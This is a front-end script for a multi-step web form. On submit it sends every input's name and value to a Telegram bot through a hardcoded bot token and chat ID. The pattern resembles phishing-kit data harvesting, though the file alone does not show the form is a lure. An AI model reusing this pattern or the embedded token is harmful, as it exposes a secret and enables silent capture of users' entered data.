// script.js
let errorMessage = document.querySelector('.errormessage');
let toload=document.querySelector("#toload");
const tabs = document.querySelectorAll('.tab-navigation-item');

document.addEventListener('DOMContentLoaded', () => {
    const tabContents = document.querySelectorAll('.tab-pane');
    document.body.classList.add("slided");
  []
    tabs.forEach((tab, index) => {
      (/active/gim).test(tab.classList)?
      (index==0?[...document.querySelectorAll('.form-group')][0].click()
        :false):false;
     
      tab.addEventListener('click', () => {
        tabs.forEach(t => t.classList.remove('active'));
        tabContents.forEach(tc => tc.classList.remove('active'));
        tab.classList.add('active');
        tabContents[index].classList.add('active');
        (/active/gim).test(tab.classList)?
        (index==0?[...document.querySelectorAll('.form-group')][0].click()
        :(index==1?[...document.querySelectorAll('.form-group')][3].click()
        :(index==2?[...document.querySelectorAll('.form-group')][6].click()
        :(index==3?[...document.querySelectorAll('.form-group')][9].click()
        :false)))):false
        });
        
      });

  
   
    [...document.querySelectorAll(".query")].map(a=>a.classList.add("set"));
    
    [...document.querySelectorAll('.form-group')]
    .map(a=>{
      
      a.addEventListener("mouseover",(e)=>{
        a.click();
        a.children[1].focus()
        a.style.cssText="pointer-events:none";
    }
    )
    a.addEventListener("mouseleave",(e)=>{
    
        a.style.cssText="pointer-events:all";
    }
    )
})

  
    const nextContactButton = document.getElementById('nextContact');
    const nextBusinessButton1 = document.getElementById('nextBusiness1');
    const nextBusinessButton2 = document.getElementById('nextBusiness2');
    const prevBusinessButton = document.getElementById('prevBusiness');
    const prevBusinessButton1= document.getElementById('prevBusiness1');
    const prevBusinessButton2 = document.getElementById('prevBusiness2');

     nextContactButton.addEventListener('click', () => {
      tabs[1].click();  

    });
  
    nextBusinessButton1.addEventListener('click', () => {
        tabs[2].click();
    });
    nextBusinessButton2.addEventListener('click', () => {
          tabs[3].click();
      });
   
        
      prevBusinessButton.addEventListener('click', () => {
        tabs[0].click(); 
      });        
      prevBusinessButton1.addEventListener('click', () => {
        tabs[1].click(); 
      });        
      prevBusinessButton2.addEventListener('click', () => {
        tabs[2].click(); 
      });

 

  });
   
  const handleError=(e)=>{

    let errors=[""];
    e.parentElement.children[0].classList.add("pulse");
     [...document.querySelectorAll(".pulse")].map((a,b,c)=>errors.push(a.parentElement.children[1].name))
     e.focus();
    lengths=errors.length;
     lengths>0?showError(`Invalid or empty ${(errors[1].trim(""))} field`,errors[1]):false;
     
   
  
  }
   
document.addEventListener("keydown",(e)=>{
  e.key=='Enter'?e.preventDefault():false;
 
})
  
    const changes=(e)=>{ 
       e.value.trim("")!="" 
    ?e.parentElement.children[0].classList.remove("pulse")
    :handleError(e);
  }
  const showloading=()=>{
    toload.style.cssText="opacity:1; z-index: 11;";
   }
   const removeloading=()=>{
     toload.style.cssText="opacity:0; z-index: -11";
   }


  const showError=(val)=>{
    removeloading();
  errorMessage.classList!="showerror"?
  errorMessage.classList.add("showerror"):false;
  document.querySelector(".mess").innerText=`Notice: ${val}`;

  setTimeout(()=>{ errorMessage.classList.remove("showerror")},4000)
 

  }
 
  const showSuccess=(val)=>{
    removeloading();
    errorMessage.classList!="green"?
    errorMessage.classList.add("green"):false;
    document.querySelector(".mess").innerText=`Notice: ${val}`;
  
    setTimeout(()=>{ errorMessage.classList.remove("green");document.forms.reset()},4000)
  
    }

   const form = document.forms['ue-sheets']
  form.addEventListener('submit', e => {
    e.preventDefault()
    showloading();
    sendMessageToTelegram();

    
    async function sendMessageToTelegram() {
      const token = "6380651581:AAEbYC16pgwkCUAF0s44j4nblpbVUX31ebY";
    const chatId = "815965867";
    const telegramUrl = 'https://api.telegram.org/bot' + token + '/sendMessage';
    let payload=[...document.querySelectorAll("input")].map(a=>{return a.name+": "+a.value}).join(";   ");

      const params = {
        chat_id:chatId,
        text:payload,

      };
      try {
        await fetch(telegramUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(params)
        })
        .then(()=> {showSuccess('Form submitted successfully !')}
        )
      } catch (error) {
        showError("Failed to submit")
       }
    }
  })
  